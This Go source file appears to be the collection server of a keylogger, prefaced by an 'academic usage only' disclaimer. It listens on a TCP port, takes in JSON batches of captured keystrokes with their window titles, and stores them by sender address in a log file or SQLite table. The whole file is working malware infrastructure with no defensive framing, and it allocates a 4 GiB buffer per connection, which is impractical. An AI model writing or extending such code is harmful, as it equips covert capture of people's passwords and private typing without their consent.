// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"net"
	"os"
	"time"
)

const (
	ModeLog = iota
	ModeDB
	ModeBoth

	Protocol = "tcp"
	Address  = "127.0.0.1:8722"

	logFile    = "keylogger.log"
	logDB      = "keylogger.db"
	logDriver  = "sqlite3"
	LogFormat  = "%s [%s] <%s> %s\n"
	TimeFormat = "2006.01.02 15:04:05.000"

	ExitListen = 1

	schema = "CREATE TABLE IF NOT EXISTS `keylogger` (`k_time` INT NOT NULL, `k_addr` VARCHAR(21) NOT NULL, `k_type` CHAR(3) NOT NULL, `k_title` VARCHAR(255) NOT NULL, `k_value` TEXT NOT NULL);"
	query  = "INSERT INTO `keylogger` (`k_time`, `k_addr`, `k_type`, `k_title`, `k_value`) VALUES (?, ?, ?, ?, ?);"
)

type KeyLog struct {
	Time  int64  `json:"time"`
	Type  string `json:"type"`
	Title string `json:"title"`
	Value string `json:"value"`
}

// writeLog appends data to the log file.
func (keyLog KeyLog) writeLog(raddr string) {
	// Format data for writing.
	data := fmt.Sprintf(LogFormat, time.UnixMilli(keyLog.Time).Format(TimeFormat), raddr, keyLog.Type, keyLog.Value)
	// Open file to append data, create if file does not exist.
	file, err := os.OpenFile(logFile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, os.ModePerm)
	if err != nil {
		fmt.Printf("Failed to opean file: %s\n", err.Error())
		fmt.Printf("Received data: %#v\n", keyLog)
		return
	}
	defer file.Close()
	// Write data to the file.
	_, err = file.WriteString(data)
	if err != nil {
		fmt.Printf("Failed to write file: %s\n", err.Error())
		fmt.Printf("Received Data: %#v\n", keyLog)
		return
	}
}

// writeDB inserts data into the database.
func (keyLog KeyLog) writeDB(raddr string) {
	db, err := sql.Open(logDriver, logDB)
	if err != nil {
		fmt.Printf("Failed to open database: %s\n", err.Error())
		fmt.Printf("Received data: %#v\n", keyLog)
		return
	}
	defer db.Close()
	_, err = db.Exec(query, keyLog.Time, raddr, keyLog.Type, keyLog.Title, keyLog.Value)
	if err != nil {
		fmt.Printf("Failed to insert data: %s\n", err.Error())
		fmt.Printf("Received Data: %#v\n", keyLog)
		return
	}
}

// writeBoth appends data to the log file and inserts data into the database.
func (keyLog KeyLog) writeBoth(raddr string) {
	keyLog.writeLog(raddr)
	keyLog.writeDB(raddr)
}

func main() {
	// According to the arguments to set recording mode.
	var mode int
	if len(os.Args) == 1 {
		mode = ModeLog
	} else {
		switch os.Args[1] {
		case "-db":
			mode = ModeDB
		case "-both":
			mode = ModeBoth
		default:
			mode = ModeLog
		}
	}
	// In ModeDB or ModeBoth, initialise database
	if mode == ModeDB || mode == ModeBoth {
		initDB()
	}
	// Initialise TCP listener.
	listener, err := net.Listen(Protocol, Address)
	if err != nil {
		fmt.Printf("Failed to listen: %s\n", err.Error())
		os.Exit(ExitListen)
	}
	defer listener.Close()
	fmt.Println("Start listening")
	// Loop forever to listen.
	for {
		// Wait for the next connection.
		conn, e := listener.Accept()
		if e != nil {
			fmt.Printf("Failed to accept: %s\n", e.Error())
			continue
		}
		// Initialise buffer for reading.
		buffer := make([]byte, 4294967296)
		// Read data from connection.
		n, e := conn.Read(buffer)
		if e != nil {
			fmt.Printf("Failed to read: %s\n", e.Error())
			continue
		}
		var keyLogs []KeyLog
		// Unserialise buffer to keyLog slice.
		e = json.Unmarshal(buffer[:n], &keyLogs)
		if e != nil {
			fmt.Printf("Failed to unmarshal:\n%s\n", string(buffer[:n]))
			_ = conn.Close()
			continue
		}
		// Traverse and write data to file according to the mode.
		for _, keyLog := range keyLogs {
			switch mode {
			case ModeLog:
				keyLog.writeLog(conn.RemoteAddr().String())
			case ModeDB:
				keyLog.writeDB(conn.RemoteAddr().String())
			case ModeBoth:
				keyLog.writeBoth(conn.RemoteAddr().String())
			}
		}
		_ = conn.Close()
	}
}

// initDB creates table in database.
func initDB() {
	// Open database.
	db, err := sql.Open(logDriver, logDB)
	if err != nil {
		fmt.Printf("Failed to open database: %s\n", err.Error())
		fmt.Println("Cannot initialise database")
		return
	}
	defer db.Close()
	// Execute query to create table.
	_, err = db.Exec(schema)
	if err != nil {
		fmt.Printf("Failed to intialise database: %s\n", err.Error())
		return
	}
}
